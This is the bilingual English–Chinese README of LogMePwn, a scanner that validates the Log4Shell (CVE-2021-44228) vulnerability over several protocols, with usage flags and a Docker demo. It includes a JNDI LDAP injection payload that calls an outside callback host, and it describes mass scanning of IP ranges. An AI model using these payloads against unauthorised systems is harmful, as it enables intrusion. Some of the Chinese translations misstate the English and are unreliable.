# LogMePwn
LogMePwn is a fully automated, multi-protocol, reliable, super-fast scanning and validation toolkit for the Log4J RCE CVE-2021-44228 vulnerability.
LogMePwn是一个全自动的，多协议的，可靠的，极速的，可以扫描和验证，被用于Log4jRCE CVE-2021-44228 漏洞上的工具组件。

![image](https://user-images.githubusercontent.com/39941993/147484381-65b7e94a-9d71-41fe-a1d4-edc8afbedcf7.png)

## Tool Highlights
- Inherent support for automatic Canary Tokens generation using emails or webhooks.
- Multi-protocol support: HTTP, IMAP, SSH, FTP, etc.
- Support for multiple HTTP methods (GET, POST, PUT, DELETE, PATCH, etc) 
- Customized HTTP request body fuzzing (JSON, XML, etc).
- Custom callback server and payload support.
- CIDR range scanning.
- Everything is multi-threaded and super fast (its written in Go).
- ...and many more. Checkout the documentation and the tool below!
-对使用电子邮件或Webhooks自动生成Canary令牌的内部支持。
-多协议支持：HTTP、IMAP、SSH、FTP等。
-支持多种HTTP方法（GET、POST、PUT、DELETE、PATCH等）
-自定义HTTP请求体fuzzing(模糊测试？)（JSON、XML等）。
-自定义回调服务器和负载支持。
-CIDR范围扫描。
-所有都是多线程的并且超快速（它是用GO写的）。
- ...还有更多。查看下面的文档和工具！

## How does it work?
LogMePwn works by making use of [Canary Tokens](https://canarytokens.org), which in-turn provides email and webhook notifications to your preferred communication channel. If you have a custom callback server, you can definitely use it too!
LogMePwn利用CanaryTokens工作，它为你首选的通信频道提供了Email和webhook通知。
如果有自己的回调服务器，当然也可以用。

## Installation & Usage
To use the tool, you can grab a binary from the [Releases](https://github.com/0xInfection/LogMePwn/releases) section as per your distribution and use it. If you want to build the tool, you'll need Go >= 1.13. Simple clone the repo and run `go build`.
要使用工具，可以从网址中获取二进制文件，根据发行版来做分类和使用。如果想要构建工具，择需要Go的版本≥ 1.13，clone仓库然后运行go build命令即可。

Here's the basic usage of the tool:
下面是工具的基本使用方法：
```powershell
$ ./lmp --help

    +---------------------+
    |   L o g M e P w n   |
    +---------------------+  v2.0

                ~ 0xInfection
Usage:
  -custom-server string
        Specify a custom callback server.
        指定一个自定义回调服务器
  -delay int
        Delay between subsequent requests for the same host to avoid overwhelming the host.
        对同一主机的后续请求之间的延迟，以避免使主机无法承受。
  -email string
        Email to use for the receiving callback notifications.
        用于接收回调通知的电子邮件。
  -fbody string
        Specify a format string to use as the body of the HTTP request.
        指定用作HTTP请求主体的格式字符串。
  -file string
        Specify a file containing list of hosts to scan.
        指定一个包含要扫描的主机的文件。
  -ftp-ports string
        Comma separated list of HTTP ports to scan per target. (default "21")
        每个目标要扫描的HTTP端口的逗号分隔列表。（默认为“21”）
  -headers string
        Comma separated list of HTTP headers to use; if empty a default set of headers are used.
        要用的HTTP头的逗号分隔列表，若空则使用一个默认的headers集。
  -headers-file string
        Specify a file containing custom set of headers to use in HTTP requests.
        指定一个在HTTP请求中包含自定义请求头的文件。
  -http-methods string
        Comma separated list of HTTP methods to use while scanning. (default "GET")
        在扫描中使用的HTTP方法的列表，用逗号分隔
  -http-ports string
        Comma separated list of HTTP ports to scan per target. (default "80,443,8080")
        扫描每个主机的HTTP端口列表，用逗号分隔
  -imap-ports string
        Comma separated list of IMAP ports to scan per target. (default "143,993")
        扫描每个目标里用逗号分割的IMAP列表。
  -json
        Use body of type JSON in HTTP requests that can contain a body.
        在可以包含正文的HTTP请求中使用JSON类型的正文。
  -payload string
        Specify a single payload or a file containing list of payloads to use.
        指定一个单一payload或者包含payload的列表文件。
  -protocol string
        Specify a protocol to test for vulnerabilities. (default "all")
        为漏洞指定一个协议进行测试
  -ssh-ports string
        Comma separated list of SSH ports to scan per target. (default "22")
        每个目标要扫描的SSH端口的逗号分隔列表。（默认为“22”）
  -threads int
        Number of threads to use while scanning. (default 10)
        扫描中线程的使用数。
  -token string
        Canary token payload to use in requests; if empty, a new token will be generated.
        请求中使用Canary token 的payload.若空，将生成一个新token.
  -user-agent string
        Custom user-agent string to use; if empty, payloads will be used.
        自定义user-agent字符集；若空，将使用payloads
  -webhook string
        Webhook to use for receiving callback notifications.
        用于接收回调通知的Webhook
  -xml
        Use body of type XML in HTTP requests that can contain a body.
        在可以包含正文的HTTP请求中使用XML类型的正文。

Examples:
  ./lmp -email alerts@testing.site 1.2.3.4 1.1.1.1:8080
  ./lmp -token xxxxxxxxxxxxxxxxxx -methods POST,PUT -fbody '<padding_here>%s<padding_here>' -headers X-Custom-Header
  ./lmp -webhook https://webhook.testing.site -file internet-ranges.lst -ports 8000,8888
  ./lmp -email alerts@testing.site -methods GET,POST,PUT,PATCH,DELETE 1.2.3.4:8880
  ./lmp -protocol imap -custom-server alerts.testing.local 1.2.3.4:143
```

### Specifying protocols
指定协议
__NEW:__ This feature was introduced in v2.0.
版本2.0中引入

With latest version support for multiple protocols has been introduced. So far we have 4 different protocols:
最新版支持下面四个：
- HTTP
- IMAP
- SSH
- FTP

If you do not specify a protocol via the `-protocol` argument, the tool will run all the plugins for every supported protocol against the default set of ports mentioned.
如果不通过-protocol命令指定，那么工具会给提到的默认端口其运行每个支持的协议的所有插件。

[_See how to control ports for every protocol._](#specifying-targets)

Example:
```powershell
./lmp -protocol ftp -custom-server alerts.testing.local 1.2.3.4:21
./lmp -protocol ssh -custom-server alerts.testing.local 1.2.3.4:22
./lmp -token xxxxxxxxxxxxxxxx 1.2.3.4 # scans for all protocols on default ports
```

### Specifying targets
The targets can be specified in two ways, via the command line interface as arguments, or via a file.
目标可以通过两种方式来指定，通过命令行插件或文件来声明。

__NEW:__ Now you can even pass CIDR ranges to scan! This feature was introduced in v1.1.
甚至可以排除CIDR范围来扫描，功能在1.1版本中引入。

Example:
```s
./lmp <other args here> 1.1.1.1:8080 1.2.3.4:80 1.1.2.2:443
./lmp <other args here> -file internet-ranges.lst
./lmp <other args here> 192.168.0.0/26 1.2.3.4/30
```

Every protocol has a default supported list of ports associated which can be fine-tuned using the following flags:
每个协议会有一个默认支持的端口列表，可以用下列命令进行微调：
- `-http-ports` for HTTP.
- `-imap-ports` for IMAP.
- `-ssh-ports` for SSH.
- `-ftp-ports` for FTP.

If the user mentions a host+port pair in form of `host:port`, the default list of ports is discarded and all checks are done for that specific port. If `-protocol` is not mentioned, all protocols' plugins will be tested against the same port.
如果用户提到以host:port形式的host+port部分，端口默认列表将被丢弃，并对特定端口做检查。如果‘-protocol’
没有被提到，所有协议的插件将在同一个端口上进行测试。

### Specifying payloads
_This feature was introduced in v1.1._
该特征于1.1版本被引入。
You can specify a payload directly via the `-payload` argument directly. However if you want the DNS name of the host which is being tested in the payload, you can specify a formatting directive `$DNSNAME$` which will be replaced with the target against which the payload is being tested.
可以直接通过“-payload”参数指定有效负载。但是，如果需要负载中正在测试的主机的DNS名称，可以指定格式化指令“$DNSNAME$”，该指令将替换为负载正在测试的目标。


e.g. if you supply a command like this:
例如，如果你提供一个像这样的命令
```js
./lmp -payload '${jndi:ldap://$DNSNAME$.xxx.burpcollaborator.net/a}' vulnerable.site.com
```
Then when sending a HTTP request to the URL, the payload would look like:
那么在发送HTTP请求时，payload看起来会像这样
```sh
${jndi:ldap://vulnerable-site-com.xxx.burpcollaborator.net/a}
```
This feature would help you evaluate which hosts are vulnerable when doing black-box fuzzing.
这个特征会帮助你评估在做黑盒测试的时候哪个主机可以被利用。

You can also specify a payload containing multiple variations of the payload using the same argument. (See [`payloads-sample.txt`](payloads-sample.txt)). Example:
可以可以使用同一个参数指定包含一个payload的多个变体的payload。
```js
./lmp -payload payloads-sample.txt vulnerable.site.com
```

> __NOTE:__ This feature doesn't work with Canary Tokens. Canarytokens doesn't support custom DNS formats.
注意：这个功能不可和Canary Tokens连用。Canary Tokens不支持自定义DNS格式。

### Specifying notification channels
指定通知渠道
> __NOTE__: If you're supplying a custom payload using `-payload`, specifying a notification channel is __NOT__ necessary. The payload itself should contain your callback server.
如果你用‘-payload’提供了一个自定义的payload,那么指定通知渠道并不必要。payload会包含到你的回调服务器。

The notification channels can be any of the following:
通知渠道可以是下面任何形式
- Email (`-email`)
- Webhook (`-webhook`)
- Custom DNS callback server (`-custom-server`)

The tool makes use of Canary Tokens, you can create one from [here](https://canarytokens.org/generate), or let the tool create a token for you. If the tool creates a token, that will be written to a file named `canarytoken-logmepwn.json`, which will include the token itself and the auth (both of which you'll need to view triggers via the web interface).
该工具使用canary tokens，您可以从[此处]创建一个(https://canarytokens.org/generate)，或者让工具为您创建一个令牌。如果该工具创建了一个令牌，它将被写入名为“canarytoken logmepwn”的文件中。json`，它将包括令牌本身和身份验证（您需要通过web界面查看这两个触发器）。

If you already have a token, you can use the `-token` argument to use the token directly and not create a new one.
如果你已经有一个token了，可以使用‘-token’语句直接使用token，而不用再创建一个新的

> __NOTE:__ If you supply either an email or a webhook, the tool will create a custom canary token. If you use a custom callback server, tokens do not come into play.
如果你没有email也没有webhook，这个工具会创建一个自定义canary token。如果你用一个自定义回调服务器，那么token不会起到作用。

### Sending requests
发送请求
The tool offers great flexibility when sending requests. By default the tool uses GET requests. A default set of headers are used, each of which contains a payload in its value. You can specify a custom set of headers via the `-headers` argument. You can use the `-headers-file` switch to supply a file containing a list of headers. Examples:
工具提供了发送请求的很大的灵活性。默认使用GET请求，默认的请求头，每个都在它的值里包含一个payload.可以通过‘-headers’语句指定一个自定义的请求头的集。可以通过‘-headers-file’跳转到包含headers的列表的文件中，例如：
```groovy
./lmp <other args> -headers 'X-Api-Version' 1.2.3.4:8080
./lmp <other args> -headers-file headers.txt 1.2.3.4:8080
```

You can specify the list of HTTP methods to use for scanning via the `-methods` switch. For requests that contain a body, e.g. `POST`, `PUT`, etc, you can customize content of the bodies.
可以指定用于扫描HTTP的方法列表，通过‘-methods’语句。包含一个请求体的请求。例如‘POST’‘PUT’等。可以自定义请求体的内容。

By default the tool sends a payload directly via the body. The tool offers customization fo the body in the following ways:
- Specify `-json` to have the request body as type JSON.
指定-json来附加JSON格式的请求体
- `-xml` for XML format.
XML格式
- `-fbody` to specify a custom format string where the payload will be injected. This allows complex request creation when testing. For example, if you want to send the content as HTML, it can look like this:
指定将注入有效负载的自定义格式字符串。这允许在测试时创建复杂的请求。例如，如果您希望以HTML格式发送内容，它可以如下所示： 
  ```s
  ./lmp -fbody '<html>%s</html>' -methods 'POST,PUT' 1.2.3.4
  ```

You can specify a custom user-agent header value via the `-user-agent` switch.
可以通过“-user-agent”指定一个自定义user-agent头

### Concurrent scanning
The tool is optimized for scanning a wide range of targets. With sufficient amount of network bandwidth and hardware, you can scan the entire IPv4 space within a day. The default number of concurrent threads to use while scanning is set at just 10 (optimised for reliability on local hardware). The value can go upto thousands (I'll leave the benchmarking task upto you). :)

该工具针对扫描范围广泛的目标进行了优化。有了足够的网络带宽和硬件，您可以在一天内扫描整个IPv4空间。扫描时要使用的默认并发线程数设置为仅10个（针对本地硬件的可靠性进行了优化）。该值可以高达数千（我将把基准测试任务留给您）。 

Use the `-threads` switch to supply the number of threads to use with the tool.
用“-threads”来提供使用该工具的线程数量。

### Specifying delay
Since a lot of HTTP requests are involved, it might be a cumbersome job for the remote host to handle the requests. The `-delay` parameter is here to help you with those cases. You can specify a delay value in seconds -- which will be used be used in between two subsequent requests to the same port on a server.
由于涉及大量HTTP请求，远程主机处理这些请求可能会很麻烦。“-delay”参数用于帮助您处理这些情况。您可以以秒为单位指定延迟值，该值将在对服务器上同一端口的两个后续请求之间使用。

## Demo
To demo the scanner, I make use of a vulnerable setup from [@christophetd](https://twitter.com/christophetd) using docker:
为了示范扫描器，用了一个使用docker安装的漏洞
```js
docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```
![image](https://user-images.githubusercontent.com/39941993/146034544-a0c0e60d-00db-44ae-823a-5e5834888108.png)

Then I run the tool against the setup:
根据设置运行工具
```js
./lmp -email alerts@testing.site -protocol http 127.0.0.1:8080
```
![image](https://user-images.githubusercontent.com/39941993/146034732-5600761b-008e-4119-83ce-b5b0f6686b7d.png)

Which immediately triggered a few DNS lookups visible on the token history page as well as my email:
这立即触发了令牌历史页面和我的电子邮件上可见的一些DNS查找： 

<img src="https://user-images.githubusercontent.com/39941993/146039240-0d34e4d8-284f-4377-bde3-ea13f9f7f5eb.png" width=49% /> <img src="https://user-images.githubusercontent.com/39941993/146039600-ab2a71b1-ec92-4cef-bae4-f3f46dc2ffd6.png" width=49% />

### Changelog
- Updates in version v2.0:
2.0版本更新
  - Introducing multi-protocol support. Protocols implemented so far:
  引入支持的多种协议，目前实现SSH,IMAP,HTTP,FTP
    - SSH
    - IMAP
    - HTTP
    - FTP

- Updates in version v1.1:
1.1版本更新
  - Ability to specify custom payloads via file or command line.
  通过文件或命令行指定特定自定义payload
  - Ability to specify custom headers via file.
  通过文件指定特定自定义头
  - CIDR range scanning.
  CIDR范围扫描

## Ideas & future roadmap
Feel free to hit me up on [Twitter](https://twitter.com/0xinfection) or create an issue or PR.

## License & Version
The tool is licensed under the GNU GPLv3. LogMePwn is currently at v2.0.

## Credits
Shoutout to the team at [Thinkst Canary](https://canary.tools/) for their amazing Canary Tokens project.

> Crafted with ♡ by [Pinaki (@0xInfection)](https://twitter.com/0xinfection).
